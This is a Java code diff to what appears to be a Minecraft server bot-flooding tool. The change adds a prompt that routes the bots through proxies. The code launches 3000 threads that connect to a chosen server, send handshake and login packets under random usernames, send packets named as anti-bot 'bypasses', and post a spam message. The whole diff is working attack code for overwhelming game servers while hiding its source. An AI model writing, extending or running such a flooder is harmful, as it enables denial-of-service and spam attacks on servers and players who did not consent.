@@ -45,6 +45,11 @@ public class Main {
             ColorsUtils.setColor("red");
             String message = bufferedReader.readLine();
 
+            ColorsUtils.setColor("cyan");
+            System.out.print("Use proxies? Y/n: ");
+            ColorsUtils.setColor("red");
+            String select = bufferedReader.readLine();
+
             String serverStatus = StatusManager.serverStatus(IP, (int) port);
 
             JSONParser jsonParser = new JSONParser();
@@ -66,7 +71,106 @@ public class Main {
             for (int j = 0; j < 3000; j++) {
 
                 bots.add(new Thread(() -> {
-                    Socket socket = new Socket(); //just type "proxy" in socket's constructor parameters to make bots join proxied.
+                    Socket socket;
+                    if (select.equalsIgnoreCase("y")) {
+                        socket = new Socket(proxy);
+                        try {
+                            try {
+                                socket.setTcpNoDelay(true);
+                                socket.setTrafficClass(18);
+                                socket.connect(address, 15000);
+                            } catch (UnknownHostException e) {
+                                System.err.println("[DivineError] Server is offline or doesn't exist!");
+                            } catch (SocketTimeoutException e) {
+                                System.err.println("[DivineError] Connection timed out, bots can't join!");
+                            } catch (ConnectException e) {
+                                System.err.println("[DivineError] Server has crashed or refuses connection.");
+                            } catch (NullPointerException e) {
+                                System.err.print("");
+                            } catch (SocketException e) {
+                                System.err.println("[DivineError] Proxy is having difficulty to connect, can't join!");
+                            }
+
+                            try {
+                                DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());
+                                DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());
+
+                                HandshakePacket handshakePacket = new HandshakePacket((int) protocol,
+                                        IP, (short) port, NextState.LOGIN);
+                                handshakePacket.sendPacket(dataOutputStream);
+
+                                Thread.sleep(250);
+
+                                LoginStart loginStart = new LoginStart("404." + new Random().nextInt(5000) + "");
+                                loginStart.sendPacket(dataOutputStream);
+
+                                //ClientSettingsBypass clientSettingsBypass = new ClientSettingsBypass("it_IT", (byte) 1, ChatMode.HIDDEN, false, (byte) 0x08, MainHand.RIGHT, true, false);
+                                //clientSettingsBypass.sendPacket(dataOutputStream);
+
+                                SetCompression setCompression = new SetCompression().readPacket(dataInputStream);
+
+                                ClientSettingsBypass clientSettingsBypass = new ClientSettingsBypass("it_IT", (byte) 1, ChatMode.HIDDEN, false, (byte) 0x08, MainHand.RIGHT, true, false);
+                                clientSettingsBypass.sendPacket(dataOutputStream);
+
+                                PlayerRotationBypass playerRotationBypass = new PlayerRotationBypass(15, 50, true);
+                                playerRotationBypass.sendPacket(dataOutputStream);
+
+                                GameStateOutput gameStateOutput = new GameStateOutput(dataOutputStream);
+                                gameStateOutput.sendMessage((int) protocol, setCompression.getThreshold(), message);
+
+                                InteractEntity interactEntity = new InteractEntity(0, Type.ATTACK, false);
+
+                        /*new Thread(() -> {
+                            try {
+                                for (;;) interactEntity.sendPacket(dataOutputStream);
+                            } catch (IOException e) {
+                                e.printStackTrace();
+                            }
+                        }).start();*/
+
+                                //LoginSuccess loginSuccess = new LoginSuccess();
+                                //loginSuccess.readPacket(dataInputStream);
+
+                                Thread.sleep(200);
+
+//                        ByteArrayOutputStream uncompressedData = new ByteArrayOutputStream();
+//                        DataOutputStream udd_outputStream = new DataOutputStream(uncompressedData);
+//
+//                        DataTypes.writeVarInt(udd_outputStream, 0x03);
+//                        DataTypes.writeString(udd_outputStream, message);
+//
+//                        int dLength = uncompressedData.size();
+//                        byte[] compressedData = CompressionUtils.compress(uncompressedData.toByteArray(), setCompression.getThreshold());
+//
+//                        ByteArrayOutputStream dL = new ByteArrayOutputStream();
+//                        DataOutputStream dLOutputStream = new DataOutputStream(dL);
+//                        DataTypes.writeVarInt(dLOutputStream, dLength);
+//
+//                        int packetLength = dL.size() + compressedData.length;
+//
+//                        DataTypes.writeVarInt(dataOutputStream, packetLength);
+//                        DataTypes.writeVarInt(dataOutputStream, dLength);
+//                        dataOutputStream.write(compressedData);
+
+                                ColorsUtils.setColor("yellow");
+                                System.out.println("Sending bots...");
+
+                                Thread.sleep(350);
+                                socket.close();
+                            } catch (SocketException e) {
+                                System.err.print("");
+                            } catch (InterruptedException e) {
+                                e.printStackTrace();
+                            }
+                        } catch (IOException e) {
+                            e.printStackTrace();
+                        }
+                        try {
+                            socket.close();
+                        } catch (IOException e) {
+                            e.printStackTrace();
+                        }
+                    } else socket = new Socket();
                     try {
                         try {
                             socket.setTcpNoDelay(true);
@@ -266,9 +370,15 @@ public class Main {
                     //long samplePlayers = (long) playersManager.get("sample");
 
                     ColorsUtils.setColor("cyan");
-                    System.out.print("IP: ");
+                    System.out.print("IP Host: ");
                     ColorsUtils.setColor("yellow");
                     System.out.println(host);
+
+                    ColorsUtils.setColor("cyan");
+                    System.out.print("Numerical IP: ");
+                    ColorsUtils.setColor("yellow");
+                    InetSocketAddress inetSocketAddress1 = new InetSocketAddress(host, port);
+                    System.out.println(inetSocketAddress1.getAddress());
 
                     ColorsUtils.setColor("cyan");
                     System.out.print("Port: ");
